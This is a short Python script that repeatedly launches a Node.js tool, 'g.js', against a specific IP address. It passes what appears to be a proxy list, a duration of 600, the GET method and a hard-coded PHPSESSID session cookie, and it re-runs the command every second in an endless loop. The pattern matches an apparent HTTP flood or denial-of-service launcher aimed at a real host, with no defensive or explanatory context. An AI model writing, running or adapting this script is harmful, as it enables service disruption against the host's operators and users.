import schedule
import time
import os
import sys

os.system('node g.js http://144.202.6.153 http.txt 600 GET PHPSESSID:1m5vdjfjvshpir1njf2epa82dq')

def job():
    os.system('node g.js http://144.202.6.153 http.txt 600 GET PHPSESSID:1m5vdjfjvshpir1njf2epa82dq')
    
schedule.every(1).seconds.do(job)

while True:
    schedule.run_pending()
    time.sleep(1)